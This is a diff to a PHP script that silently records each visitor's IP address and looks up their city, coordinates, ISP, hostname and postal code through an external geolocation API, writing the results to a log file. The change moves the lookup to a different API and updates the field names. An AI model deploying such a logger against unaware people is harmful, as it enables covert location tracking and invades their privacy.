@@ -1,6 +1,6 @@
 <?php
    // Set your own timezone
-   date_default_timezone_set("Asia/Bangkok");
+   date_default_timezone_set("America/Sao_Paulo");
    // Turn off display warns
    ini_set('display_errors','Off');
    function getip()
@@ -26,7 +26,7 @@
    }
    function iplocation($ipadress)
    {
-      $ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ipadress}/json"));
+      $ip_details = json_decode(file_get_contents("http://ip-api.com/json/$ipadress"));
       return $ip_details;
    }
    $localips = array("127.0.0.1", "::1");
@@ -37,17 +37,16 @@
    {
       fwrite($log, "\n\n###############IP is localhost##############\n\n");
    }
-   // ty https://github.com/CybrDev
    fwrite($log, "IP Adress: {$ip}");
    fwrite($log, stuff($ip));
    fwrite($log, "\n\n-----------Location--------------\n\n");
    fwrite($log, "\n\nCity (Inaccurate):" . $location->city . PHP_EOL);
 	fwrite($log, "Region:" . $location->region . PHP_EOL);
 	fwrite($log, "Country:" . $location->country . PHP_EOL);
-	fwrite($log, "Location:" . $location->loc . PHP_EOL);
-	fwrite($log, "Isp: " . $location->org . PHP_EOL);
+	fwrite($log, "Location:" . $location->lat." ".$location->lon . PHP_EOL);
+	fwrite($log, "Isp: " . $location->isp . PHP_EOL);
     fwrite($log, "Hostname: " . $location->hostname .PHP_EOL);
-    fwrite($log, "Postal_code:" . $location->postal ."\n");
+    fwrite($log, "Postal_code:" . $location->zip ."\n");
    fclose($log);
 
 ?>
